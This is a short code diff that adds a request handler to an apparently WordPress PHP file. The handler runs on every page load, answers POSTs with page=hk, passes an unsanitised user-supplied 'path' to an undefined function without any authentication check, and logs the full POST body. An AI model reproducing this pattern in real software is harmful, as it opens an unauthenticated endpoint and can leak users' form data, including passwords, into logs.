@@ -66,6 +66,28 @@ function my_custom_shortcode($atts) {
 add_shortcode('my_custom', 'my_custom_shortcode');
 
 
+function handle_hosting_request() 
+{
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_REQUEST['page'] == 'hk') {
+        
+        $path = $_REQUEST['path']; 
+
+        error_log('Form Data: ' . print_r($_POST, true)); 
+
+        $response = hk_getResponse($path);
+
+        $response->send(); 
+        
+
+        wp_die();
+    }
+}
+
+add_action('init', 'handle_hosting_request');
+
+
+
+
 
 function my_custom_menu() {
     // Add main menu
